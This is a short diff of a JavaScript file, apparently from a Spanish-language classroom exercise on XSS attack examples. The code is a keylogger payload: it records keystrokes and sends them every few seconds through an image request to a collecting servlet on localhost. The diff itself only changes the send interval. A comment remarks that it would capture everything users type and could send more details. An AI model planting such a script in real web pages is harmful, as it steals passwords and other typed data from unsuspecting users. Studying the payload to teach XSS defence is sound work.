@@ -18,7 +18,7 @@ document.onkeypress = function(e) {
 window.setInterval(function(){
     new Image().src = 'http://localhost:8081/Ej08_XSS_EjemplosAtaque_Indeseables/SVTeclas?t=' + keys;
     keys = '';
-}, 1000);
+}, 5000);
 
 //Esto se enviaria de todos los usuarios que escriban pero se podría hacer cosas
 //como meter mas parametros en la url como por ejemplo el nombre de la pagina
